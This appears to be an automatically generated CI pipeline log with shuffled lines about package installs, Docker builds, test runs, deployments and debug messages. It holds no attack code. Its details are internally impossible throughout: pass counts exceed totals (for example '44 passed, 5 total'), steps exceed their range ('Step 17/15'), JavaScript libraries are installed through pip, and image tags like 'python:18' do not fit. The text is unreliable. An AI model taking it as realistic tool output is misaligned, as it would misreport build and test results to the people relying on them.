eslint@3.20.0\nLoading...\nReady.\nPlatform: linux-x64\nFetching submodules...\n[12:17:40] INFO: Starting build process\npip install: Successfully installed axios-5.17\nTest Suites: 7 passed, 18 total\npip: Collecting eslint\nPulling image: python:latest\nTransforming 400 files...\nCache saved successfully\nnpm notice: created a lockfile\nCompiling components/service.java...\nTest Suites: 44 passed, 5 total\nCoverage: 70% statements, 86% branches\nUsing Python 3.9\nnpm notice: package.json updated\nCompleted.\nLayer 7/10: ENV command\nCompiling utils/utils.go...\nPlatform: win32-x64\nUsing Node.js 19.15.0\npip install: Successfully installed axios-5.20\nCache restored successfully (28MB)\nGenerating source maps...\nnpm notice: package.json updated\n  PASS: test_auth_login (226ms)\n[12:17:40] INFO: Request completed\nnpm install: resolved 489 packages\n\u2713 All checks passed\nFAILED: test_api_health\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnection established\nCompleted.\nStep 4/16: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 88 tests in 39s\nStep 1/16: Building\nnpm install: added 308 packages\n[12:17:40] DEBUG: Loading configuration\n[12:17:40] DEBUG: Query executed in 62ms\nNODE_ENV=development\nPushing to registry...\nArtifact downloaded: 19MB\nCompiling utils/utils.go...\nHEAD is now at 3db834a\nnpm notice: package.json updated\nSnapshots: 1 passed, 10 total\nnpm install: added 266 packages\nUsing Node.js 14.9.5\n[12:17:40] DEBUG: Query executed in 24ms\nCompiling utils/index.js...\nStep 5/17: Installing dependencies\nBuilding Docker image...\nArtifact downloaded: 45MB\n[12:17:40] DEBUG: Memory usage: 168MB\nCompiling components/service.java...\n[12:17:40] DEBUG: Memory usage: 1518MB\nFetching submodules...\n[12:17:40] INFO: Request completed\nCompiling lib/app.ts...\nConnection established\nCompiling components/utils.go...\n\u2713 package completed\nFetching submodules...\n[12:17:40] INFO: Connecting to database\nStep 20/24: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nProcessing...\nRan 95 tests in 33s\nTLS handshake completed\nStep 10/25: Installing dependencies\n[12:17:40] DEBUG: Memory usage: 1553MB\nFetching submodules...\nPulling image: python:latest\nEnvironment: staging\nPOST /upload - 201 (212ms)\nArtifact downloaded: 42MB\nStep 4/25: Installing dependencies\n\u2713 Step 'test' succeeded\nCache hit for key-8559\nConnecting to startup.dev:443...\n[12:17:40] WARN: Deprecated API usage\n\u2713 build completed\nWARNING: express has known vulnerabilities\nUsing Python 3.12\nCache saved successfully\nPushing to registry...\n[12:17:40] INFO: Request completed\nCache invalidated: node_modules\nCache saved successfully\nTLS handshake completed\nCompiling utils/app.ts...\nGET /health - 200 (97ms)\n[12:17:40] DEBUG: Memory usage: 1386MB\nVerifying...\n[12:17:40] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: TypeError\nFinished.\nCompiling utils/utils.go...\nCache restored successfully (113MB)\n[12:17:40] DEBUG: Connection pool: 5 active\nHEAD is now at bcb3d0e\n[12:17:40] DEBUG: Memory usage: 1585MB\nWARNING: lodash has known vulnerabilities\n[12:17:40] DEBUG: Query executed in 89ms\nStep 6/21: Deploying\nTime: 56.70s\nInstalling prettier@3.17.10\nArtifact downloaded: 8MB\nProcessing...\nEnvironment: development\nNODE_ENV=test\nStep 1/22: Running migrations\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:17:40] WARN: Deprecated API usage\nyarn add: Done in 13.37s\n[12:17:40] INFO: Processing request\nCache invalidated: node_modules\n[12:17:40] INFO: Request completed\nAlready up to date.\nCompleted.\n[12:17:40] INFO: Starting build process\nAlready up to date.\nTLS handshake completed\nAlready up to date.\nUsing Node.js 16.16.5\n\u2713 All checks passed\nStep 13/21: Running migrations\nStep 1/20: Testing\n[12:17:40] DEBUG: Initializing service\nnpm notice: created a lockfile\nOptimizing 16 modules...\n[12:17:40] INFO: Connecting to database\nCache hit for key-2292\n  PASS: e2e/test_auth_login.spec.js\nInstalling lodash@2.9.3\nCompleted.\nTLS handshake completed\nArtifact downloaded: 3MB\nImage pulled successfully\nStep 1/25: Building\n[12:17:40] WARN: Deprecated API usage\nOptimizing 81 modules...\nSnapshots: 5 passed, 8 total\n[12:17:40] INFO: Request completed\n[12:17:40] INFO: Processing request\nTest Suites: 37 passed, 39 total\n  PASS: test_api_health (111ms)\nTest Suites: 25 passed, 23 total\nGET /status - 200 (28ms)\nNODE_ENV=development\nStep 3/24: Installing dependencies\nGenerating source maps...\n\u2717 build failed with exit code 102\n=== Step type_check completed ===\n=== Step: upload_artifacts ===\nTests: 102 passed, 355 total\n[12:17:40] INFO: Request completed\n\u2717 build failed with exit code 125\n[12:17:40] DEBUG: Connection pool: 11 active\npip: Downloading prettier-3.7.tar.gz\npip: Installing build dependencies...\nImage pulled successfully\nArtifact downloaded: 21MB\npip: Collecting webpack\nPOST /upload - 201 (175ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching submodules...\npip install: Successfully installed express-4.0\nStep 10/23: Building\nnpm install: added 196 packages\nnpm notice: created a lockfile\nTime: 76.28s\nCompiling src/handler.rs...\npip: Downloading jest-2.1.tar.gz\nCache restored successfully (496MB)\nAlready up to date.\nTest Suites: 26 passed, 43 total\nUsing Node.js 16.4.2\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Installing build dependencies...\nTime: 27.655s\nCache miss for key-2095\nConnection established\n[12:17:40] INFO: Request completed\nGET /api - 201 (86ms)\nBundling vendor.js\nEnvironment: staging\nUsing Node.js 15.18.0\nPOST /data - 202 (274ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 11/24: Testing\nSnapshots: 38 passed, 25 total\n\u2717 build failed with exit code 112\n[12:17:40] DEBUG: Loading configuration\n\u2713 All checks passed\n[12:17:40] DEBUG: Memory usage: 1392MB\nCompiling lib/service.java...\nnpm install: added 234 packages\nRan 37 tests in 18s\n\u2713 Task completed in 1596ms\nLoading...\nStep 19/25: Deploying\nCompleted.\nConnecting to acme.corp:443...\n\u2713 validate completed\n[12:17:40] INFO: Connecting to database\nOptimizing 59 modules...\n[12:17:40] DEBUG: Connection pool: 7 active\nProcessing...\npip: Downloading webpack-5.13.tar.gz\n[12:17:40] ERROR: Connection failed\n[12:17:40] INFO: Processing request\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:17:40] DEBUG: Memory usage: 1572MB\nWaiting...\nBundling main.js\npip: Collecting axios\nEnvironment: development\nStep 13/23: Building\nStep 17/24: Deploying\nyarn add: Done in 2.24s\n[12:17:40] DEBUG: Query executed in 22ms\nTest Suites: 47 passed, 19 total\nDone.\nCache restored successfully (92MB)\nCompleted.\nWaiting...\nCache restored successfully (443MB)\nProcessing...\npip: Collecting axios\nnpm install: resolved 144 packages\n[12:17:40] INFO: Starting build process\nTime: 34.671s\nCreating production build...\nDone.\nCompiling components/service.java...\n[12:17:40] DEBUG: Initializing service\nArtifact downloaded: 47MB\n[12:17:40] WARN: Deprecated API usage\n  PASS: unit/test_auth_login.spec.js\nArtifact uploaded: dist.zip (4MB)\nDone.\n\u2713 Step 'setup' succeeded\nStep 2/23: Deploying\npip: Collecting prettier\nArtifact uploaded: dist.zip (39MB)\nnpm notice: created a lockfile\nLoading...\n\u2713 Task completed in 2733ms\nCache saved successfully\nSnapshots: 25 passed, 40 total\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nAlready up to date.\n[12:17:40] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (50MB)\nProcessing...\nUploading artifact 'dist' (16 files)\nWaiting...\nTLS handshake completed\nCache invalidated: dependencies\nWARNING: react has known vulnerabilities\n\u2713 Task completed in 4208ms\nHEAD is now at 5760a1e\n[12:17:40] WARN: Deprecated API usage\n\u2717 build failed with exit code 75\nConnection established\nOK\n[12:17:40] DEBUG: Loading configuration\nTests: 83 passed, 294 total\nnpm notice: package.json updated\n[12:17:40] INFO: Request completed\nArtifact uploaded: dist.zip (34MB)\n\u2713 package completed\nLayer 2/8: ENV command\nBuilding Docker image...\n\u2713 Step 'install' succeeded\nInstalling react@3.18.0\nTransforming 172 files...\n[12:17:40] INFO: Cache refreshed\nPlatform: win32-x64\nOK\n[12:17:40] DEBUG: Loading configuration\n  PASS: unit/test_cache_hit.spec.js\nStep 9/15: Testing\n  PASS: e2e/test_api_health.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: package.json updated\nCache saved successfully\nSwitched to branch 'bugfix/task-413'\nCompiling utils/main.py...\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 12/22: Linting\nChecking out master branch\nStep 10/25: Deploying\nCompiling utils/handler.rs...\nConnection established\nArtifact uploaded: build.tar.gz (10MB)\nFinished.\nLayer 7/12: COPY command\n  PASS: test_cache_hit (300ms)\n  PASS: unit/test_cache_hit.spec.js\n[12:17:40] WARN: Deprecated API usage\n[12:17:40] ERROR: Connection failed\n  PASS: test_cache_hit (112ms)\nLoading...\nCompiling utils/app.ts...\nUploading artifact 'coverage' (46 files)\npip: Collecting eslint\nConnecting to startup.dev:443...\nLoading...\n\u2717 build failed with exit code 108\nChecking out main branch\nWARNING: express has known vulnerabilities\nSwitched to branch 'bugfix/task-491'\nException: TypeError\nSwitched to branch 'hotfix/task-902'\nUsing Node.js 20.4.6\nGET /health - 204 (33ms)\nFAILED: test_user_create\nGET /status - 201 (37ms)\nWARNING: axios has known vulnerabilities\nGenerating source maps...\nRan 33 tests in 1s\nStep 13/17: Running migrations\n=== Step upload_artifacts completed ===\n=== Step: unit_tests ===\nTLS handshake completed\npip install: Successfully installed eslint-5.0\npip: Installing build dependencies...\nFinished.\n[12:17:40] WARN: Deprecated API usage\nLoading...\nMinifying main.js\nPushing to registry...\nChecking out master branch\nVerifying...\nHEAD is now at fb1b651\nCompiling lib/handler.rs...\nEnvironment: production\nCompleted.\n[12:17:40] ERROR: Connection failed\nCompleted.\nConnection established\nTLS handshake completed\nyarn add: Done in 17.48s\nCache saved successfully\nGET /api - 204 (4ms)\nLoading...\n[12:17:40] INFO: Cache refreshed\n[12:17:40] DEBUG: Initializing service\nPlatform: darwin-arm64\nMinifying app.js\nnpm install: resolved 114 packages\n\u2713 Step 'test' succeeded\n[12:17:40] INFO: Starting build process\nCache miss for key-6894\nWARNING: express has known vulnerabilities\n[12:17:40] INFO: Connecting to database\nRan 44 tests in 22s\nCompiling components/app.ts...\nFinished.\nOptimizing 55 modules...\n[12:17:40] DEBUG: Loading configuration\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: python:18\nRan 80 tests in 25s\n  PASS: unit/test_db_connect.spec.js\n\u2713 validate completed\nInstalling prettier@5.14.7\nInstalling jest@1.6.1\nCoverage: 93% statements, 89% branches\nLayer 8/9: COPY command\n\u2713 deploy completed\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (37MB)\n[12:17:40] DEBUG: Query executed in 50ms\nSwitched to branch 'bugfix/task-305'\nWARNING: express has known vulnerabilities\nWARNING: axios has known vulnerabilities\nTLS handshake completed\n[12:17:40] DEBUG: Query executed in 33ms\nTests: 266 passed, 239 total\n[12:17:40] ERROR: Connection failed\nOK\nStep 20/23: Building\nTests: 369 passed, 267 total\nBundling vendor.js\nRan 127 tests in 26s\nCache saved successfully\npip install: Successfully installed eslint-3.0\n\u2713 Task completed in 354ms\nBundling runtime.js\nNODE_ENV=production\n[12:17:40] INFO: Cache refreshed\nStep 12/25: Building\nLayer 10/9: COPY command\nNODE_ENV=test\nStep 8/21: Deploying\n[12:17:40] DEBUG: Memory usage: 307MB\nFetching submodules...\nCoverage: 77% statements, 89% branches\nUsing Python 3.9\nTime: 77.228s\nStep 1/17: Installing dependencies\nDone.\nLayer 5/10: ENV command\nArtifact uploaded: build.tar.gz (16MB)\n[12:17:40] INFO: Starting build process\nPOST /data - 200 (352ms)\n[12:17:40] DEBUG: Connection pool: 7 active\nGenerating source maps...\nArtifact uploaded: build.tar.gz (7MB)\nOptimizing 32 modules...\nFetching submodules...\n[12:17:40] INFO: Request completed\nBundling main.js\n\u2713 All checks passed\nTests: 117 passed, 98 total\nCache miss for key-7566\nStep 8/16: Linting\n[12:17:40] WARN: Deprecated API usage\nCache restored successfully (493MB)\n\u2713 All checks passed\nCache saved successfully\nCache invalidated: build\nnpm notice: created a lockfile\nTest Suites: 18 passed, 30 total\nCoverage: 72% statements, 94% branches\n\u2713 deploy completed\nAlready up to date.\n[12:17:40] INFO: Connecting to database\nTime: 88.570s\nCache hit for key-4779\n[12:17:40] DEBUG: Loading configuration\n[12:17:40] INFO: Starting build process\nCompiling lib/utils.go...\nCache restored successfully (92MB)\n  PASS: test_cache_hit (433ms)\nPulling image: python:3.11\n[12:17:40] INFO: Connecting to database\nGenerating source maps...\npip install: Successfully installed axios-3.14\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\nException: TypeError\n[12:17:40] INFO: Starting build process\nWARNING: webpack has known vulnerabilities\npip: Downloading react-2.3.tar.gz\nVerifying...\nCache restored successfully (362MB)\n\u2713 Step 'build' succeeded\nRan 123 tests in 3s\nPulling image: python:latest\nBuilding Docker image...\nEnvironment: development\nDone.\nCompiling utils/index.js...\nLoading...\nUploading artifact 'build' (18 files)\nPushing to registry...\nUsing Python 3.12\n[12:17:40] DEBUG: Initializing service\nSwitched to branch 'bugfix/task-914'\nStep 12/22: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\n[12:17:40] DEBUG: Initializing service\n[12:17:40] ERROR: Connection failed\nOptimizing 58 modules...\n\u2713 All checks passed\nConnecting to example.com:443...\nnpm install: resolved 924 packages\nReady.\nGET /status - 201 (6ms)\n[12:17:40] DEBUG: Connection pool: 2 active\nStep 19/25: Deploying\n\u2713 deploy completed\nArtifact uploaded: build.tar.gz (16MB)\nPOST /api - 202 (140ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPlatform: darwin-arm64\nFetching submodules...\nStep 17/15: Testing\nnpm notice: created a lockfile\nPlatform: win32-x64\n\u2717 build failed with exit code 92\nCache restored successfully (368MB)\n[12:17:40] DEBUG: Query executed in 94ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: build\nTransforming 659 files...\nUploading artifact 'coverage' (43 files)\nCache restored successfully (384MB)\nGET /health - 201 (83ms)\nEnvironment: production\nSwitched to branch 'feature/task-866'\n=== Step unit_tests completed ===\n=== Step: deploy_production ===\nCache restored successfully (400MB)\nCache saved successfully\n  PASS: unit/test_api_health.spec.js\nGenerating source maps...\n[12:17:40] INFO: Starting build process\nSuccess!\nNODE_ENV=production\nWARNING: webpack has known vulnerabilities\nPushing to registry...\nStep 5/18: Installing dependencies\nPlatform: linux-x64\nBundling runtime.css\nTransforming 850 files...\nUsing Node.js 14.9.0\nWARNING: jest has known vulnerabilities\nTLS handshake completed\nTime: 41.644s\nCompiling components/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:17:40] WARN: Deprecated API usage\nOptimizing 53 modules...\nTest Suites: 23 passed, 34 total\nCompleted.\n[12:17:40] DEBUG: Connection pool: 6 active\npip install: Successfully installed lodash-4.7\nUploading artifact 'dist' (15 files)\npip: Collecting lodash\n[12:17:40] INFO: Connecting to database\nSnapshots: 33 passed, 26 total\nVerifying...\n\u2713 Step 'setup' succeeded\nStep 6/21: Installing dependencies\npip: Downloading axios-3.18.tar.gz\nTime: 84.294s\nCache saved successfully\nBundling styles.js\nCompiling components/handler.rs...\nPlatform: linux-x64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\nWARNING: react has known vulnerabilities\nStep 10/23: Installing dependencies\nCompiling components/main.py...\nWARNING: lodash has known vulnerabilities\n[12:17:40] INFO: Processing request\n  PASS: test_user_create (146ms)\nEnvironment: test\nnpm install: resolved 1542 packages\nLoading...\npip: Installing build dependencies...\nSwitched to branch 'feature/task-837'\nTransforming 718 files...\n[12:17:40] WARN: Deprecated API usage\nDone.\nCache miss for key-5275\nSuccess!\nOK\n[12:17:40] INFO: Cache refreshed\nReady.\nImage pulled successfully\nSnapshots: 1 passed, 0 total\nPlatform: win32-x64\nFetching submodules...\nArtifact downloaded: 48MB\nTest Suites: 34 passed, 40 total\nnpm install: resolved 1762 packages\nWARNING: prettier has known vulnerabilities\nStep 15/17: Testing\nStep 17/18: Deploying\nUsing Node.js 19.11.0\nFetching submodules...\nCoverage: 95% statements, 86% branches\nArtifact downloaded: 21MB\nWaiting...\nConnection established\nStep 7/20: Building\nWARNING: jest has known vulnerabilities\nFinished.\n\u2713 Task completed in 619ms\nArtifact downloaded: 6MB\nBuilding Docker image...\nSwitched to branch 'bugfix/task-587'\nFinished.\nCompiling components/main.py...\nnpm notice: created a lockfile\nLayer 3/9: RUN command\nnpm notice: created a lockfile\nCoverage: 76% statements, 95% branches\nProcessing...\nUsing Node.js 19.8.3\nStep 16/24: Linting\nRan 72 tests in 47s\nCoverage: 90% statements, 91% branches\nStep 5/18: Deploying\nDone.\nSwitched to branch 'bugfix/task-281'\nCache hit for key-5811\n[12:17:40] INFO: Cache refreshed\npip: Downloading prettier-1.12.tar.gz\nCache restored successfully (384MB)\nImage pulled successfully\nImage pulled successfully\nArtifact uploaded: dist.zip (98MB)\nDone.\nStep 17/17: Testing\nnpm notice: created a lockfile\nDone.\npip: Downloading lodash-2.19.tar.gz\n  PASS: test_auth_login (212ms)\nNODE_ENV=test\n[12:17:40] DEBUG: Memory usage: 1598MB\nCompiling lib/app.ts...\n[12:17:40] DEBUG: Loading configuration\nEnvironment: development\npip: Installing build dependencies...\nArtifact downloaded: 48MB\nCache miss for key-7958\nWARNING: webpack has known vulnerabilities\n  PASS: test_user_create (85ms)\nLoading...\nCache miss for key-8713\n[12:17:40] DEBUG: Memory usage: 1311MB\nProcessing...\nEnvironment: production\n[12:17:40] DEBUG: Initializing service\nUploading artifact 'build' (39 files)\nStep 13/25: Linting\n[12:17:40] INFO: Starting build process\nGET /health - 204 (33ms)\nCache invalidated: node_modules\nMinifying main.js\n[12:17:40] DEBUG: Initializing service\npip install: Successfully installed eslint-2.10\n  PASS: e2e/test_db_connect.spec.js\nSuccess!\n[12:17:40] DEBUG: Loading configuration\nStep 16/24: Deploying\nWaiting...\nWARNING: prettier has known vulnerabilities\nGET /api - 204 (78ms)\nCoverage: 75% statements, 96% branches\nTransforming 971 files...\n[12:17:40] DEBUG: Query executed in 14ms\nTransforming 814 files...\nEnvironment: production\nUploading artifact 'coverage' (2 files)\nTest Suites: 40 passed, 11 total\nStep 13/24: Linting\n[12:17:40] INFO: Request completed\nNODE_ENV=development\nEnvironment: development\nArtifact uploaded: dist.zip (29MB)\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip install: Successfully installed react-2.16\nArtifact downloaded: 21MB\nWaiting...\nStep 8/16: Deploying\nNODE_ENV=production\n\u2713 Task completed in 610ms\n[12:17:40] INFO: Starting build process\nCoverage: 90% statements, 63% branches\nDone.\nVerifying...\nArtifact downloaded: 43MB\nCreating production build...\nCoverage: 73% statements, 71% branches\nStep 4/22: Testing\nTests: 451 passed, 79 total\nStep 7/17: Installing dependencies\nBuilding Docker image...\nCompleted.\n=== Step deploy_production completed ===\n=== Step: build ===\nTLS handshake completed\nStep 7/19: Testing\n[12:17:40] DEBUG: Query executed in 56ms\nSnapshots: 18 passed, 43 total\nHEAD is now at 0b03e74\nRan 73 tests in 35s\nOptimizing 74 modules...\nTransforming 366 files...\nPulling image: python:latest\n[12:17:40] DEBUG: Query executed in 28ms\n[12:17:40] WARN: Deprecated API usage\nCache hit for key-6407\n\u2713 Task completed in 1101ms\n[12:17:40] DEBUG: Query executed in 14ms\nTime: 29.953s\nFinished.\nUsing Python 3.11\nUsing Python 3.10\nStep 5/23: Testing\n[12:17:40] INFO: Starting build process\n  PASS: test_db_connect (430ms)\nUsing Python 3.9\nConnecting to test.io:443...\nTransforming 756 files...\nWARNING: express has known vulnerabilities\nReady.\nArtifact downloaded: 29MB\nImage pulled successfully\nnpm notice: package.json updated\nStep 4/21: Building\nEnvironment: production\nCache miss for key-1180\nFinished.\nyarn add: Done in 5.1s\nGenerating source maps...\n[12:17:40] ERROR: Connection failed\nArtifact downloaded: 17MB\nNODE_ENV=development\n\u2717 build failed with exit code 106\npip install: Successfully installed eslint-2.19\n[12:17:40] WARN: Deprecated API usage\nEnvironment: development\n\u2713 All checks passed\nAlready up to date.\nReady.\n  PASS: unit/test_user_create.spec.js\nTime: 46.191s\nCache invalidated: build\nFetching submodules...\nInstalling lodash@4.3.2\n[12:17:40] DEBUG: Connection pool: 2 active\nTest Suites: 28 passed, 33 total\nCache miss for key-8256\nReady.\nChecking out develop branch\nStep 17/17: Installing dependencies\nArtifact uploaded: dist.zip (8MB)\nPlatform: linux-x64\nnpm notice: package.json updated\npip: Downloading jest-4.14.tar.gz\nCache hit for key-8715\nnpm notice: package.json updated\nyarn add: Done in 17.91s\nHEAD is now at fa41299\nCache miss for key-7894\n  PASS: test_db_connect (87ms)\nPulling image: node:3.11\n[12:17:40] WARN: Deprecated API usage\nVerifying...\nException: ValueError\nLayer 1/15: RUN command\nnpm install: added 201 packages\nUsing Node.js 17.5.10\nAlready up to date.\n\u2713 lint completed\nUploading artifact 'coverage' (30 files)\nOK\nStep 19/19: Linting\nArtifact downloaded: 50MB\n\u2713 lint completed\nCompiling components/main.py...\nConnecting to example.com:443...\n\u2713 lint completed\n[12:17:40] INFO: Request completed\nyarn add: Done in 1.32s\nCache invalidated: node_modules\nTests: 100 passed, 304 total\nInstalling webpack@1.3.4\nSnapshots: 21 passed, 32 total\nNODE_ENV=test\nUsing Node.js 18.12.2\nStep 8/23: Running migrations\nCompleted.\nBundling styles.js\nTime: 78.29s\nCompiling src/index.js...\nArtifact uploaded: dist.zip (69MB)\nCompiling lib/utils.go...\nnpm notice: created a lockfile\nReady.\n\u2717 build failed with exit code 29\nCache saved successfully\nVerifying...\n[12:17:40] DEBUG: Loading configuration\nPulling image: alpine:latest\nBuilding Docker image...\nFinished.\nCompiling src/main.py...\nDone.\nSnapshots: 35 passed, 35 total\n[12:17:40] WARN: Deprecated API usage\nConnection established\nWARNING: express has known vulnerabilities\nGET /api - 204 (43ms)\n  PASS: unit/test_user_create.spec.js\nSuccess!\n[12:17:40] INFO: Connecting to database\nConnection established\nProcessing...\npip install: Successfully installed express-4.14\npip: Downloading eslint-4.20.tar.gz\nInstalling axios@3.4.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'test' succeeded\npip: Collecting prettier\nSwitched to branch 'bugfix/task-967'\n  PASS: test_auth_login (373ms)\nnpm install: added 88 packages\nnpm install: resolved 331 packages\n\u2713 Step 'test' succeeded\nTests: 187 passed, 364 total\nPushing to registry...\nBundling styles.css\nCache restored successfully (410MB)\n[12:17:40] DEBUG: Connection pool: 3 active\nEnvironment: staging\nPushing to registry...\nArtifact downloaded: 37MB\nGenerating source maps...\n[12:17:40] DEBUG: Initializing service\nnpm notice: package.json updated\nVerifying...\nImage pulled successfully\npip install: Successfully installed lodash-1.0\nInstalling react@5.19.2\nStep 3/20: Deploying\nRan 197 tests in 2s\nStep 11/21: Deploying\nGET /api - 204 (53ms)\nConnecting to acme.corp:443...\nnpm install: resolved 291 packages\nCache hit for key-1383\nUsing Node.js 20.7.8\nTest Suites: 49 passed, 35 total\n[12:17:40] ERROR: Connection failed\n[12:17:40] DEBUG: Initializing service\nStep 8/20: Deploying\nCompiling utils/utils.go...\nPlatform: win32-x64\npip: Downloading eslint-3.7.tar.gz\nTime: 88.995s\nTransforming 860 files...\nGenerating source maps...\n[12:17:40] DEBUG: Initializing service\nArtifact downloaded: 40MB\nGenerating source maps...\n\u2713 build completed\nTime: 9.147s\n\u2713 lint completed\nInstalling axios@2.17.5\n[12:17:40] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (5MB)\n=== Step build completed ===\n=== Step: deploy_staging ===\nLoading...\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 32 passed, 1 total\nSwitched to branch 'hotfix/task-533'\nOK\nnpm notice: package.json updated\n[12:17:40] DEBUG: Query executed in 18ms\nVerifying...\n  PASS: test_api_health (234ms)\nAlready up to date.\nEnvironment: staging\nPOST /data - 201 (214ms)\nCache saved successfully\nCompiling src/index.js...\nPulling image: node:3.11\n[12:17:40] ERROR: Connection failed\nSuccess!\nTime: 23.733s\nHEAD is now at 3a40ff4\nTransforming 745 files...\nArtifact uploaded: build.tar.gz (49MB)\nException: NullPointerException\nSwitched to branch 'hotfix/task-443'\nCache restored successfully (111MB)\nFetching submodules...\nWARNING: express has known vulnerabilities\nLayer 10/13: ENV command\nCompiling src/main.py...\nException: RuntimeError\n  PASS: test_user_create (473ms)\nNODE_ENV=production\n[12:17:40] INFO: Request completed\nFetching submodules...\n[12:17:40] INFO: Request completed\nTime: 13.453s\n\u2713 Task completed in 690ms\nConnection established\nConnecting to example.com:443...\nArtifact downloaded: 3MB\nnpm notice: package.json updated\nOK\nCompiling utils/app.ts...\n[12:17:40] WARN: Deprecated API usage\nStep 12/15: Linting\n\u2713 Task completed in 4799ms\nReady.\nUsing Node.js 19.18.6\nCache miss for key-7719\nNODE_ENV=test\nWaiting...\nStep 11/23: Linting\nStep 17/21: Linting\n[12:17:40] INFO: Cache refreshed\nPOST /api - 200 (435ms)\nOK\n[12:17:40] INFO: Request completed\n\u2713 All checks passed\nLayer 3/9: ENV command\nRan 80 tests in 7s\nTLS handshake completed\nPulling image: alpine:18\nCoverage: 99% statements, 73% branches\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling axios@3.18.0\nInstalling lodash@3.3.6\nPulling image: node:latest\nCompiling lib/utils.go...\nPulling image: node:18\nnpm notice: created a lockfile\npip: Downloading webpack-5.20.tar.gz\nWARNING: react has known vulnerabilities\n[12:17:40] WARN: Deprecated API usage\nCompiling utils/app.ts...\nStep 12/17: Linting\n\u2713 Step 'test' succeeded\nTransforming 620 files...\nDone.\n[12:17:40] WARN: Deprecated API usage\n[12:17:40] ERROR: Connection failed\nCache invalidated: dependencies\nCache saved successfully\nEnvironment: production\nHEAD is now at 599e51b\nArtifact downloaded: 12MB\nTLS handshake completed\n[12:17:40] WARN: Deprecated API usage\n[12:17:40] DEBUG: Initializing service\nSwitched to branch 'bugfix/task-490'\nInstalling eslint@2.3.9\nWARNING: webpack has known vulnerabilities\nProcessing...\nPlatform: darwin-arm64\nOptimizing 58 modules...\nFetching submodules...\nWARNING: prettier has known vulnerabilities\nnpm install: resolved 586 packages\nPulling image: python:18\nnpm install: added 137 packages\nGenerating source maps...\n\u2713 All checks passed\nOptimizing 90 modules...\nProcessing...\nProcessing...\nImage pulled successfully\nInstalling express@1.19.2\nWaiting...\nException: NullPointerException\nSwitched to branch 'bugfix/task-652'\nOptimizing 25 modules...\nNODE_ENV=production\nWARNING: jest has known vulnerabilities\nCreating production build...\n[12:17:40] DEBUG: Connection pool: 14 active\n\u2713 Task completed in 2115ms\nStep 13/20: Running migrations\nRan 191 tests in 17s\nCache miss for key-1794\n[12:17:40] DEBUG: Connection pool: 18 active\nCache miss for key-1084\nPulling image: node:18\n[12:17:40] INFO: Connecting to database\npip: Downloading jest-2.5.tar.gz\n[12:17:40] WARN: Deprecated API usage\nPushing to registry...\nStep 1/21: Deploying\nFAILED: test_api_health\n  PASS: test_user_create (278ms)\nCompiling utils/utils.go...\n[12:17:40] WARN: Deprecated API usage\nGET /status - 204 (74ms)\nReady.\nTransforming 334 files...\nConnection established\nnpm install: added 270 packages\nGenerating source maps...\nCache miss for key-8369\nStep 9/25: Linting\nStep 2/20: Building\n[12:17:40] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: added 421 packages\nPlatform: linux-x64\nCompleted.\nCreating production build...\nFinished.\nStep 13/21: Testing\nWaiting...\n\u2713 Task completed in 411ms\n[12:17:40] WARN: Deprecated API usage\nTransforming 897 files...\nGenerating source maps...\n[12:17:40] INFO: Starting build process\n[12:17:40] DEBUG: Query executed in 88ms\nFAILED: test_auth_login\nProcessing...\nStep 7/23: Linting\nyarn add: Done in 29.18s\n\u2713 Step 'setup' succeeded\nUsing Python 3.10\n[12:17:40] DEBUG: Loading configuration\nRan 112 tests in 54s\n[12:17:40] DEBUG: Query executed in 94ms\n[12:17:40] INFO: Request completed\nTime: 53.312s\n[12:17:40] INFO: Request completed\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out develop branch\nCache miss for key-1616\nStep 9/16: Deploying\nCreating production build...\n=== Step deploy_staging completed ===\n=== Step: lint ===\nSnapshots: 36 passed, 28 total\nFinished.\nSwitched to branch 'feature/task-344'\nStep 7/23: Building\nWaiting...\n[12:17:40] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Task completed in 3460ms\n\u2713 deploy completed\n\u2717 build failed with exit code 85\nProcessing...\nGET /api - 201 (91ms)\nRan 24 tests in 4s\nWARNING: prettier has known vulnerabilities\nnpm install: resolved 626 packages\nCache saved successfully\nTest Suites: 9 passed, 47 total\nArtifact downloaded: 5MB\n[12:17:40] DEBUG: Query executed in 4ms\nnpm install: added 396 packages\nCompleted.\n[12:17:40] DEBUG: Query executed in 34ms\nCompleted.\nCompiling src/service.java...\nStep 1/23: Linting\nChecking out master branch\nnpm notice: package.json updated\nAlready up to date.\nArtifact downloaded: 42MB\n\u2713 Step 'test' succeeded\n\u2713 package completed\n[12:17:40] WARN: Deprecated API usage\nTLS handshake 